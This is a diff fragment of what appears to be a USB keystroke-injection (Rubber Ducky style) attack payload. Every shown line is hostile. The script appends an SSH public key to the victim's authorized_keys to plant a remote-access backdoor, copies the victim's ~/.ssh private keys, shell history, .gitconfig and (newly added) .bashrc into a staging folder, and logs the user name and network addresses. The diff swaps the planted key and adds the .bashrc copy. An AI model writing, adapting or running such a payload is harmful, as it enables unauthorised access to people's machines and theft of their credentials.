@@ -10,13 +10,15 @@ STRING rm ~/sample.sh
 ENTER
 STRING touch ~/.ssh/authorized_keys
 ENTER
-STRING echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDJz+uLagY7SoQbW/zUdBRdW3WnocUz+5FON8We9UITO sample@host >> ~/.ssh/authorized_keys
+STRING echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIO47w6Hw9y4QI8HIYuGgw2g3rEY78R8AuIOmODT9Env sample@host >> ~/.ssh/authorized_keys
 ENTER
 STRING cp -r ~/.ssh ~/temp_dir
 ENTER
 STRING cp ~/.bash_history ~/temp_dir
 ENTER
 STRING cp ~/.gitconfig ~/temp_dir
+ENTER
+STRING cp ~/.bashrc ~/temp_dir
 ENTER
 STRING (whoami && ip a) >> ~/temp_dir/.details
 ENTER
